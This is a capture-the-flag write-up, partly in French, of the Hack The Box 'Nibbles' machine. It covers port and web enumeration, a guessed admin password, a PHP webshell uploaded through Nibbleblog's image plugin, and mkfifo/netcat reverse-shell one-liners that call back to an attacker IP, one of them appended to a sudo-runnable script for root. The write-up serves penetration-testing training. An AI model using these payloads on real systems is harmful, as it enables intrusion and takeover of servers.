---
cover: .gitbook/assets/lab.jpg
coverY: 0
---

# Exploit Methodology

## <mark style="color:red;">Enumeration</mark>

1.  <mark style="color:green;">**Nmap Scan Initial**</mark> <mark style="color:green;"></mark><mark style="color:green;">:</mark>

    * **Commande** : `nmap -sV --open -oA nibbles_initial_scan <ip address>`
    * **Objectif** : Scanner les 1 000 ports par défaut et identifier les services ouverts.

    ```bash
    nmap -sV --open -oA nibbles_initial_scan 10.129.42.190
    ```

    **Résultats** :

    * Port 22 (SSH) : OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
    * Port 80 (HTTP) : Apache httpd (Ubuntu)
2. <mark style="color:green;">**Banner Grabbing avec Netcat**</mark> <mark style="color:green;"></mark><mark style="color:green;">:</mark>
   *   **Commande** :

       ```bash
       nc -nv 10.129.42.190 22
       ```

       ```bash
       nc -nv 10.129.42.190 80
       ```
   * **Objectif** : Confirmer les services en cours d'exécution sur les ports ouverts.
3.  <mark style="color:green;">**Scan Complet des Ports TCP**</mark> <mark style="color:green;"></mark><mark style="color:green;">:</mark>

    * **Commande** : `nmap -p- --open -oA nibbles_full_tcp_scan <ip address>`
    * **Objectif** : Scanner tous les ports TCP (65 535) pour détecter d'autres services potentiellement ouverts.

    ```bash
    nmap -p- --open -oA nibbles_full_tcp_scan 10.129.42.190
    ```
4.  <mark style="color:green;">**Nmap Script Scan**</mark> <mark style="color:green;"></mark><mark style="color:green;">:</mark>

    * **Commande** : `nmap -sC -p 22,80 -oA nibbles_script_scan <ip address>`
    * **Objectif** : Utiliser des scripts Nmap par défaut pour des informations supplémentaires sur les services.

    ```bash
    nmap -sC -p 22,80 -oA nibbles_script_scan 10.129.42.190
    ```
5.  <mark style="color:green;">**Énumération des Applications Web**</mark> <mark style="color:green;"></mark><mark style="color:green;">:</mark>

    * **Commande** : `nmap -sV --script=http-enum -oA nibbles_nmap_http_enum <ip address>`
    * **Objectif** : Énumérer les répertoires et applications web courants.

    ```bash
    nmap -sV --script=http-enum -oA nibbles_nmap_http_enum 10.129.42.190
    ```

***

## <mark style="color:red;">**Outils et Commandes Importants**</mark>

* <mark style="color:green;">**Nmap : Utilisé pour l'énumération des ports et services.**</mark>
  * `-sV` : Détection des versions des services.
  * `--open` : Affiche uniquement les ports ouverts.
  * `-oA` : Sortie de tous les formats (XML, Greppable, Text).
  * `-p-` : Scanne tous les ports.
  * `-sC` : Utilise des scripts Nmap par défaut.
  * `--script=http-enum` : Énumération des répertoires web.
* <mark style="color:green;">**Netcat (nc) : Utilisé pour le banner grabbing.**</mark>
  * `nc -nv <ip> <port>` : Connexion à un port spécifique pour récupérer la bannière.

***

<mark style="color:green;">**Conseils Pratiques**</mark>

* **Notetaking** : Prendre des notes détaillées et chronologiques de toutes les actions et résultats est crucial. Cela facilite la rédaction des rapports et assure qu'aucune information importante n'est perdue.
* **Habit de Sauvegarde** : Enregistrer toutes les sorties de scan et les logs est essentiel pour une bonne gestion des preuves et pour les références futures.

***

## <mark style="color:red;">Footprinting Walkthrough</mark>

<mark style="color:green;">**Introduction**</mark>

This is a detailed walkthrough of the initial stages of web footprinting for the `Nibbles` box on Hack The Box (HTB). We'll use tools such as `whatweb`, `curl`, `gobuster`, and manual analysis to uncover information about the target web application and identify potential vulnerabilities.

<mark style="color:green;">**Initial Enumeration with whatweb**</mark>

We start by using `whatweb` to identify web technologies in use.

```bash
mrroboteLiot@htb:~$ whatweb 10.129.42.190
```

Output:

{% code title="Output" overflow="wrap" %}
```plaintext
http://10.129.42.190 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190]
```
{% endcode %}

The scan indicates the server is running Apache 2.4.18 on Ubuntu.

<mark style="color:green;">**Manual Analysis**</mark>

Browsing to the target IP reveals a "Hello world!" message. Viewing the page source shows an interesting HTML comment:

```html
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

<mark style="color:green;">**Directory Enumeration with whatweb and Gobuster**</mark>

We use `whatweb` to further explore the `/nibbleblog` directory.

```bash
mrroboteLiot@htb:~$ whatweb http://10.129.42.190/nibbleblog
```

Output:

{% code title="Output" overflow="wrap" %}
```plaintext
http://10.129.42.190/nibbleblog/ [200 OK] Apache[2.4.18], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190], JQuery, MetaGenerator[Nibbleblog], PoweredBy[Nibbleblog], Script, Title[Nibbles - Yum yum]
```
{% endcode %}

This confirms the site is running Nibbleblog.

Next, we use Gobuster to enumerate directories.

{% code title="Gobuster" overflow="wrap" %}
```bash
mrroboteLiot@htb:~$ gobuster dir -u http://10.129.42.190/nibbleblog/ --wordlist /usr/share/dirb/wordlists/common.txt
```
{% endcode %}

Output:

```plaintext
/admin (Status: 301)
/admin.php (Status: 200)
/content (Status: 301)
/index.php (Status: 200)
/languages (Status: 301)
/plugins (Status: 301)
/README (Status: 200)
/themes (Status: 301)
```

***

## <mark style="color:red;">**Analyzing Discovered Pages**</mark>

We find that `/admin.php` is accessible and attempt to find the Nibbleblog version by checking the `README`.

```bash
mrroboteLiot@htb:~$ curl http://10.129.42.190/nibbleblog/README
```

Output:

```plaintext
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01
```

This indicates the Nibbleblog version 4.0.3, which is known to have a file upload vulnerability.

<mark style="color:green;">**Exploring Directories**</mark>

We explore the `/content` directory and find `users.xml` which confirms the admin username.

{% code title="content" overflow="wrap" %}
```bash
mrroboteLiot@htb:~$ curl -s http://10.129.42.190/nibbleblog/content/private/users.xml | xmllint --format -
```
{% endcode %}

Output:

```xml
<users>
  <user username="admin">
    <id type="integer">0</id>
    <session_fail_count type="integer">2</session_fail_count>
    <session_date type="integer">1608182184</session_date>
  </user>
</users>
```

This reveals the username is `admin`.

***

## <mark style="color:red;">**Finding Potential Password**</mark>

Exploring the `config.xml` file, we find some hints:

{% code overflow="wrap" %}
```bash
mrroboteLiot@htb:~$ curl -s http://10.129.42.190/nibbleblog/content/private/config.xml | xmllint --format -
```
{% endcode %}

Output:

```xml
<config>
  <name type="string">Nibbles</name>
  <slogan type="string">Yum yum</slogan>
</config>
```

The name `Nibbles` is used multiple times, hinting it might be the password.

<mark style="color:green;">**Summary of Findings**</mark>

1. Nmap scan reveals Apache server on port 80.
2. HTML comments and manual browsing indicate Nibbleblog.
3. `whatweb` and Gobuster reveal technologies and directories.
4. `README` confirms Nibbleblog version 4.0.3.
5. Manual exploration of directories confirms admin username.
6. `config.xml` hints at the admin password being `nibbles`.

**Next Steps**

With the username `admin` and the potential password `nibbles`, we can attempt to log in and use the identified file upload vulnerability to gain further access. This process highlights the importance of thorough enumeration and analysis in web penetration testing.

***

## <mark style="color:red;">Initial Foothold</mark>

<mark style="color:green;">**Exploiting the Nibbleblog Upload Vulnerability**</mark>

1. **Access the Admin Portal:**
   * After gaining access to the Nibbleblog admin portal using the credentials `admin:nibbles`, navigate through the various sections of the portal to identify potential attack vectors.
2. **Plugins Section:**
   * The Plugins section, particularly the "My image" plugin, allows image uploads. We can attempt to upload a PHP script disguised as an image to gain code execution on the server.
3. **Upload PHP Script:**
   *   Create a PHP script to test for code execution:

       ```php
       <?php system('id'); ?>
       ```
   * Save the script as `image.php` and upload it using the "My image" plugin.
4. **Check Upload Location:**
   * The file might be uploaded to a specific directory, such as `/nibbleblog/content/private/plugins/my_image/`. Verify the upload location by checking the directory listing or brute-forcing with tools like Gobuster if necessary.
5. **Execute the Script:**
   *   Access the uploaded PHP script via a web browser or cURL:

       {% code overflow="wrap" %}
       ```bash
       curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php
       ```
       {% endcode %}
   * This should return the output of the `id` command, confirming code execution.
6. **Get a Reverse Shell:**
   *   Modify the PHP script to initiate a reverse shell. Replace `<ATTACKING IP>` with your IP address and `<LISTENING PORT>` with your chosen port:

       {% code overflow="wrap" %}
       ```php
       <?php system("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKING IP> <LISTENING PORT> >/tmp/f"); ?>
       ```
       {% endcode %}
   *   Upload the modified script and start a netcat listener on your machine:

       ```bash
       nc -lvnp <LISTENING PORT>
       ```

{% hint style="info" %}
<mark style="color:green;">**Explication**</mark>

1. **`rm /tmp/f`** : Cette commande supprime le fichier `/tmp/f` s'il existe déjà. Ceci est une précaution pour s'assurer qu'il n'y a pas de conflit avec un fichier existant.
2. **`mkfifo /tmp/f`** : Cette commande crée un FIFO (First In First Out), également appelé pipe nommé, à `/tmp/f`. Un FIFO est un type spécial de fichier qui peut être utilisé pour la communication entre processus.
3. **`cat /tmp/f`** : Cette commande lit le contenu du pipe nommé `/tmp/f`.
4. **`| /bin/sh -i 2>&1`** : Le contenu lu par `cat /tmp/f` est passé à un shell interactif (`/bin/sh -i`). L'option `-i` signifie que le shell est interactif. `2>&1` redirige les erreurs standard (stderr) vers la sortie standard (stdout), ce qui permet de capturer toutes les erreurs dans la sortie du shell.
5. **`| nc 10.10.10.10 1234`** : La sortie du shell est ensuite envoyée à `nc` (netcat), qui établit une connexion réseau vers l'adresse IP `10.10.10.10` sur le port `1234`. Netcat est un outil utilisé pour lire et écrire des données à travers les connexions réseau en utilisant le protocole TCP ou UDP.
6. **`>/tmp/f`** : La sortie de la connexion réseau est redirigée vers le pipe nommé `/tmp/f`. Cela permet de créer une boucle où les commandes et leurs sorties sont envoyées et reçues via le pipe et la connexion réseau.



<mark style="color:green;">**Explication de l'ensemble de la commande**</mark>

Cette commande réalise les étapes suivantes pour établir un reverse shell :

1. **Suppression de tout fichier existant** nommé `/tmp/f` pour éviter les conflits.
2. **Création d'un pipe nommé** (`/tmp/f`) qui permet la communication entre processus.
3. **Lecture du pipe** (`/tmp/f`) et passage de cette lecture à un shell interactif (`/bin/sh -i`).
4. **Redirection des erreurs standard** vers la sortie standard afin de capturer toutes les erreurs dans la sortie du shell.
5. **Établissement d'une connexion réseau** à une adresse IP et un port spécifiés (10.10.10.10:1234) via `nc`.
6. **Redirection de la sortie de la connexion réseau** vers le pipe nommé, créant ainsi une boucle de communication.



<mark style="color:green;">**Fonctionnement de la boucle**</mark>

* **Entrée des commandes** : Les commandes envoyées par l'attaquant à travers la connexion réseau arrivent dans le pipe nommé (`/tmp/f`).
* **Exécution des commandes** : Le shell interactif (`/bin/sh -i`) lit ces commandes depuis le pipe et les exécute.
* **Sortie des commandes** : La sortie des commandes (y compris les erreurs) est envoyée via `nc` à l'attaquant.
* **Boucle** : Cette sortie est redirigée vers le pipe nommé, où elle peut être lue et renvoyée à l'attaquant, permettant une communication continue.
{% endhint %}

1. **Trigger the Reverse Shell:**
   * Execute the PHP script by accessing it via the browser or cURL again. This should provide you with a reverse shell.
2. **Upgrade to a Fully Interactive Shell:**
   *   Use Python to upgrade your shell:

       ```bash
       python3 -c 'import pty; pty.spawn("/bin/bash")'
       ```
   * If Python2 is not available, use Python3 as shown above.
3. **Post-Exploitation Enumeration:**
   *   Explore the filesystem and user directories. For instance:

       ```bash
       ls /home/nibbler
       ```
   * You should find `user.txt` containing the user flag and potentially other interesting files like `personal.zip`.

***

## <mark style="color:red;">Privilege Escalation on Nibbles</mark>

Now that we have a reverse shell, our next objective is to escalate privileges to the root user. We will accomplish this by leveraging the writable script we found in `personal.zip`.

<mark style="color:green;">**Steps to Privilege Escalation:**</mark>

1.  **Unzip the File:**

    * Unzip the `personal.zip` file found in the `nibbler` user's home directory.

    ```bash
    unzip personal.zip
    ```
2.  **Inspect the Script:**

    * Inspect the contents of the `monitor.sh` script.

    ```bash
    cat /home/nibbler/personal/stuff/monitor.sh
    ```

    * The script is a monitoring script, and it is writable by the `nibbler` user.
3.  **Automate Enumeration with LinEnum.sh:**

    * Download LinEnum.sh to perform automated privilege escalation checks.

    ```bash
    wget http://<your_ip>:8080/LinEnum.sh
    chmod +x LinEnum.sh
    ./LinEnum.sh
    ```

    * Start a Python HTTP server on your attack machine to serve LinEnum.sh.

    ```bash
    sudo python3 -m http.server 8080
    ```
4.  **Check Sudo Privileges:**

    * LinEnum.sh reveals that the `nibbler` user can run `monitor.sh` with sudo without a password.

    ```bash
    User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
    ```
5.  **Modify the Script:**

    * Append a reverse shell payload to the `monitor.sh` script.

    {% code title="monitor" overflow="wrap" %}
    ```bash
    echo 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKING IP> <LISTENING PORT> >/tmp/f' | tee -a /home/nibbler/personal/stuff/monitor.sh
    ```
    {% endcode %}

    * Replace `<ATTACKING IP>` and `<LISTENING PORT>` with your attack machine’s IP address and chosen port.
6.  **Start Netcat Listener:**

    * Start a netcat listener on your attack machine to catch the reverse shell.

    ```bash
    nc -lvnp <LISTENING PORT>
    ```
7.  **Execute the Script with Sudo:**

    * Run the `monitor.sh` script with sudo to escalate privileges.

    ```bash
    sudo /home/nibbler/personal/stuff/monitor.sh
    ```
8.  **Catch the Reverse Shell:**

    * Check your netcat listener for a connection and confirm root access.

    ```bash
    listening on [any] 8443 ...
    connect to [10.129.42.190] from (UNKNOWN) [10.129.42.190] 47488
    # id
    uid=0(root) gid=0(root) groups=0(root)
    ```
9.  **Grab the Root Flag:**

    * Navigate to the root directory and read the `root.txt` flag.

    ```bash
    cat /root/root.txt
    ```
